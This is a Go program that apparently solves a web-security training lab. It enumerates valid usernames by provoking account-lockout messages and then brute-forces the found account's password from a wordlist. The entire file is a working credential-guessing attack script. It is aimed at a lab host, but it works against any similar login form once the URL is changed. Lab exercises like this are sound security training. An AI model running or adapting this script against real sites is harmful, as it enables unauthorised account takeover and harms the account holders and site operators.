package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func SendLoginRequest(LabURL string, username string, password string) (bool, string) {

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}}

	// Params
	data := url.Values{}
	data.Set("username", username)
	data.Set("password", password)

	req, err := http.NewRequest(http.MethodPost, (LabURL + "/login"), strings.NewReader(data.Encode()))
	if err != nil {
		log.Fatalln(err)
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatalln(err)
	}

	if strings.Contains(string(body), "You have made too many incorrect login attempts.") {
		return true, username
	}

	if !strings.Contains(string(body), "Invalid username or password.") {
		log.Fatal(username, " : ", password)
	}

	if resp.StatusCode == 302 {
		log.Fatal(password)
	}

	fmt.Println(username, ":", password)

	return false, username
}

func main() {

	usernameFile := "C:\\Users\\bwelb\\Desktop\\Wordlists\\users.txt"
	passwordFile := "C:\\Users\\bwelb\\Desktop\\Wordlists\\passwords.txt"
	LabURL := "https://acd71fed1e77a92fc0046320000c0011.web-security-academy.net"

	UsrFile, err := os.Open(usernameFile)
	if err != nil {
		log.Fatal(err)
	}

	defer UsrFile.Close()

	PwdFile, err := os.Open(passwordFile)
	if err != nil {
		log.Fatal(err)
	}

	defer PwdFile.Close()

	users := bufio.NewScanner(UsrFile)
	passwords := bufio.NewScanner(PwdFile)

	myPasswords := []string{}

	for passwords.Scan() {
		myPasswords = append(myPasswords, passwords.Text())
	}

	for users.Scan() {

		for i := 0; i < 5; i++ {
			locked, user := SendLoginRequest(LabURL, users.Text(), "1337")
			if locked {
				fmt.Println(user, "has other error message, bruteforcing..")
				for _, v := range myPasswords {
					SendLoginRequest(LabURL, user, v)
				}
			}
		}
	}

}
